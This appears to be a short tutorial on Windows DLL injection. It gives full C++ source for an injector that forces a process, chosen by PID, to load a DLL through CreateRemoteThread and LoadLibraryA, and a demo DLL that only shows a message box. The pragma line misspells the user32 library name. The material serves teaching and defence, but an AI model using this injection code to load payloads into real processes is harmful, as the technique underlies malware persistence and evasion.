It takes the process identifier as command line input and get a handle to the process and writes the DLL into it.

Sequence of APIs : [OpenProcess](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openprocess) -> [VirtualAllocEx](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualallocex) -> [WriteProcessMemory](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory) -> [CreateRemoteThread](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createremotethread)

The dll just opens a messagebox.

## <span style="color:red">evil_inj.cpp</span>

```cpp
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>
#include <tlhelp32.h>

char evilDLL[] = "C:\\evil.dll";

unsigned int evilLen = sizeof(evilDLL) + 1;

int main(int argc, char* argv[]){
    HANDLE ph;
    HANDLE rt;
    LPVOID rb;

    HMODULE hKernel32 = GetModuleHandle("Kernel32");
    FARPROC lb = GetProcAddress(hKernel32, "LoadLibraryA");

    if(atoi(argv[1]) == 0){
        printf("PID not found :( exiting...\n");
        return -1;
    }

    printf("PID : %i", atoi(argv[1]));
    ph = OpenProcess(PROCESS_ALL_ACCESS, FALSE, DWORD(atoi(argv[1])));

    rb = VirtualAllocEx(ph, NULL, evilLen, (MEM_RESERVE | MEM_COMMIT), PAGE_READWRITE);

    WriteProcessMemory(ph, rb, evilDLL, evilLen, NULL);

    rt = CreateRemoteThread(ph, NULL, 0, (LPTHREAD_START_ROUTINE)lb, rb, 0, NULL);
    CloseHandle(ph);
    return 0;
}
```

## <span style="color:red">evil.cpp(DLL)</span>

```cpp
#include <windows.h>
#pragma comment (lib, "uesr32.lib")

BOOL APIENTRY DllMain(HMODULE hModule, DWORD nReason, LPVOID lpReserved){
    switch (nReason){
        case DLL_PROCESS_ATTACH:
            MessageBox(
                NULL,
                "Meow from evil.dll",
                "=^..^=",
                MB_OK
            );
            break;
        case DLL_PROCESS_DETACH:
            break;
        case DLL_THREAD_ATTACH:
            break;
        case DLL_THREAD_DETACH:
            break;
    }
    return TRUE;
}
```
